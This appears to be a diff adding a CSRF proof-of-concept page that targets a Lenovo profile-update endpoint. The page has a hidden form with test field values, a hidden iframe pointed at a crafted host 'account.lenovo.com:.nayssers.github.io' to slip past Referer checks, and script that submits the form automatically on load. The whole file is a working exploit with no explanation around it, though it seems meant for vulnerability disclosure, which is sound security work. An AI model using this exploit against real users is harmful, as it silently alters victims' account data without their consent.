@@ -1,0 +1,26 @@
+<html>
+  <body>
+    <form action="https://openapi.lenovo.com/us/en/v1/profile/update?isEditPersonalInfo=true" method="POST">
+      <input type="hidden" name="avatarPath" value="">
+      <input type="hidden" name="titleCode" value="">
+      <input type="hidden" name="firstName" value="testmesa123">
+      <input type="hidden" name="lastName" value="sss55">
+      <input type="submit" value="Submit CSRF">
+    </form>
+
+    <script>
+      // Create a hidden iframe and send the POST request from within it
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+
+      // Point the iframe to exploit the Referer validation bypass
+      iframe.src = "https://account.lenovo.com:.nayssers.github.io";
+      
+      // Automatically submit the form after loading the iframe
+      iframe.onload = function() {
+        document.forms[0].submit();
+      };
+    </script>
+  </body>
+</html>
